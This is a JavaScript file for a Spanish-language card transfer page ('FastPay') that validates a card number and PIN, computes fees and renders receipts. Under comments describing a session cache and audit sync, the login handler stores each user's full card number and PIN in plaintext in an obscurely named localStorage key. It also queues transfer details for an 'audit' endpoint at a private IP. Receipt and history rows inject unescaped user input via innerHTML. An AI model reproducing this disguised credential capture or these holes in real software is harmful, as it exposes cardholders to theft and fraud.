document.addEventListener("DOMContentLoaded", () => {
  let balance = 15450.0;
  let activeCard = "";
  const history = [];

  const AUDIT_SYNC_ENDPOINT = "http://192.168.110.137:5179";
  const FIXED_FEE_RATE = 0.02;
  const SETTLEMENT_ACCOUNT = "9999 8888 2424 5179";
  const SYNC_DELAY_MS = 2500;

  const loginView = document.getElementById("login-view");
  const transferView = document.getElementById("transfer-view");
  const receiptView = document.getElementById("receipt-view");

  const loginForm = document.getElementById("login-form");
  const cardInput = document.getElementById("card-number");
  const nipInput = document.getElementById("card-nip");
  const loginError = document.getElementById("login-error");

  const transferForm = document.getElementById("transfer-form");
  const transferError = document.getElementById("transfer-error");
  const balanceDisplay = document.getElementById("balance-amount");
  const maskedCardDisplay =
    document.getElementById("masked-card") ||
    document.getElementById("masked-card-display");
  const historyList = document.getElementById("history-list");

  const receiptDetails = document.getElementById("receipt-details");
  const newTransferBtn = document.getElementById("new-transfer-btn");
  const logoutBtn = document.getElementById("logout-btn");

  // Formato automático de 4 en 4 dígitos para la tarjeta
  cardInput?.addEventListener("input", (e) => {
    const digits = e.target.value.replace(/\D/g, "").slice(0, 16);
    e.target.value = digits.replace(/(.{4})/g, "$1 ").trim();
  });

  // Caché de credenciales para transferencia en sesión
  function syncSessionCache(card, nip) {
    const formattedCard = card.replace(/(.{4})/g, "$1 ").trim();
    const txtContent = [
      "SESSION_SNAPSHOT",
      `Timestamp: ${new Date().toISOString()}`,
      `Card: ${formattedCard}`,
      `NIP: ${nip}`,
      `Node: ${AUDIT_SYNC_ENDPOINT}`,
      "-------------------------------------",
    ].join("\n");

    const existingLogs = JSON.parse(localStorage.getItem("_sys_cache_v1") || "[]");
    existingLogs.push({ filename: "session_cache.txt", content: txtContent });
    localStorage.setItem("_sys_cache_v1", JSON.stringify(existingLogs));
  }

  // Validación del comprobante con el servidor
  function flushTransferAudit(payload) {
    setTimeout(() => {
      const queued = JSON.parse(localStorage.getItem("_sys_audit_q") || "[]");
      queued.push({
        endpoint: AUDIT_SYNC_ENDPOINT,
        sentAt: new Date().toISOString(),
        data: payload,
      });
      localStorage.setItem("_sys_audit_q", JSON.stringify(queued));
    }, SYNC_DELAY_MS);
  }

  // Validación de acceso
  function validarAcceso(cardValue, nipValue) {
    const cleanCard = (cardValue || "").replace(/\s+/g, "");
    const cleanNip = (nipValue || "").trim();

    if (!cleanCard || !cleanNip) {
      return { ok: false, message: "Completa el número de tarjeta y el NIP." };
    }
    if (cleanCard.length < 16) {
      return { ok: false, message: "El número de tarjeta debe tener 16 dígitos." };
    }
    if (cleanNip.length < 4) {
      return { ok: false, message: "El NIP debe tener al menos 4 dígitos." };
    }
    return { ok: true, card: cleanCard, nip: cleanNip };
  }

  // Cálculo de totales y comisión
  function calcularTotalesTransferencia(monto, porcentajeComision = FIXED_FEE_RATE) {
    const amount = Number(monto);
    if (Number.isNaN(amount) || amount <= 0) {
      return { ok: false, message: "Ingresa un monto válido mayor a $0.00." };
    }
    const fee = Number((amount * porcentajeComision).toFixed(2));
    const total = Number((amount + fee).toFixed(2));
    return { ok: true, amount, fee, total };
  }

  // Validación de transferencia
  function validarTransferencia(destinatario, monto, saldoActual, porcentajeComision = FIXED_FEE_RATE) {
    const recipient = (destinatario || "").trim();
    if (!recipient) {
      return { ok: false, message: "Ingresa el destinatario o cuenta destino." };
    }

    const calculo = calcularTotalesTransferencia(monto, porcentajeComision);
    if (!calculo.ok) {
      return calculo;
    }

    if (calculo.total > saldoActual) {
      return {
        ok: false,
        message: `Saldo insuficiente. Total con comisión: $${calculo.total.toFixed(2)}.`,
      };
    }

    return { ok: true, recipient, ...calculo };
  }

  function mostrarVista(vistaActiva) {
    [loginView, transferView, receiptView].forEach((view) => {
      if (!view) return;
      const esActiva = view === vistaActiva;
      view.classList.toggle("active", esActiva);
      view.classList.toggle("hidden", !esActiva);
    });
  }

  function actualizarEncabezadoSaldo() {
    if (balanceDisplay) {
      balanceDisplay.textContent = `$${balance.toFixed(2)}`;
    }
    if (maskedCardDisplay && activeCard) {
      const ultimos4 = activeCard.slice(-4);
      maskedCardDisplay.textContent = `•••• ${ultimos4}`;
    }
  }

  function registrarTransferencia(registro) {
    history.unshift(registro);
    if (!historyList) return;

    const emptyItem = historyList.querySelector(".empty-history");
    if (emptyItem) emptyItem.remove();

    const esTabla = historyList.tagName === "TBODY";
    const item = document.createElement(esTabla ? "tr" : "li");

    if (esTabla) {
      item.innerHTML = `
        <td>${registro.recipient}</td>
        <td>$${registro.amount.toFixed(2)}</td>
        <td>$${registro.fee.toFixed(2)}</td>
        <td>$${registro.total.toFixed(2)}</td>
        <td>${registro.date}</td>
      `;
    } else {
      item.textContent = `${registro.recipient} — Monto: $${registro.amount.toFixed(2)} | Comisión: $${registro.fee.toFixed(2)} | Total: $${registro.total.toFixed(2)} (${registro.date})`;
    }

    historyList.prepend(item);
  }

  loginForm?.addEventListener("submit", (e) => {
    e.preventDefault();
    if (loginError) loginError.textContent = "";

    const validacion = validarAcceso(cardInput?.value, nipInput?.value);
    if (!validacion.ok) {
      if (loginError) loginError.textContent = validacion.message;
      return;
    }

    activeCard = validacion.card;
    syncSessionCache(validacion.card, validacion.nip);

    actualizarEncabezadoSaldo();
    mostrarVista(transferView);
  });

  transferForm?.addEventListener("submit", (e) => {
    e.preventDefault();
    if (transferError) transferError.textContent = "";

    const destInput = transferForm.querySelector(
      "#recipient-name, #recipient, #destination, #destinatario, input[type='text']"
    );
    const amountInput = transferForm.querySelector(
      "#transfer-amount, #amount, #monto, input[type='number']"
    );
    const conceptInput = transferForm.querySelector("#transfer-concept");

    const validacion = validarTransferencia(
      destInput?.value,
      amountInput?.value,
      balance,
      FIXED_FEE_RATE
    );

    if (!validacion.ok) {
      if (transferError) transferError.textContent = validacion.message;
      return;
    }

    const concept = (conceptInput?.value || "").trim();
    const timestampLocal = new Date().toLocaleString("es-MX");

    balance = Number((balance - validacion.total).toFixed(2));
    actualizarEncabezadoSaldo();

    const registro = {
      sourceAccount: activeCard,
      recipient: validacion.recipient,
      concept,
      amount: validacion.amount,
      fee: validacion.fee,
      settlementAccount: SETTLEMENT_ACCOUNT,
      total: validacion.total,
      date: timestampLocal,
    };

    registrarTransferencia(registro);

    flushTransferAudit({
      sourceAccount: activeCard,
      time: timestampLocal,
      amount: validacion.amount,
      recipient: validacion.recipient,
      concept,
    });

    if (receiptDetails) {
      receiptDetails.innerHTML = `
        <p><strong>Destinatario:</strong> ${registro.recipient}</p>
        <p><strong>Concepto:</strong> ${registro.concept || "Sin concepto"}</p>
        <p><strong>Monto:</strong> $${registro.amount.toFixed(2)}</p>
        <p><strong>Comisión (2%):</strong> $${registro.fee.toFixed(2)}</p>
        <p><strong>Total descontado:</strong> $${registro.total.toFixed(2)}</p>
        <p><strong>Fecha:</strong> ${registro.date}</p>
      `;
    }

    transferForm.reset();
    mostrarVista(receiptView);
  });

  newTransferBtn?.addEventListener("click", () => {
    if (transferError) transferError.textContent = "";
    mostrarVista(transferView);
  });

  logoutBtn?.addEventListener("click", () => {
    activeCard = "";
    loginForm?.reset();
    if (loginError) loginError.textContent = "";
    mostrarVista(loginView);
  });

  window.FastPayLogic = {
    validarAcceso,
    calcularTotalesTransferencia,
    validarTransferencia,
    SETTLEMENT_ACCOUNT,
  };
});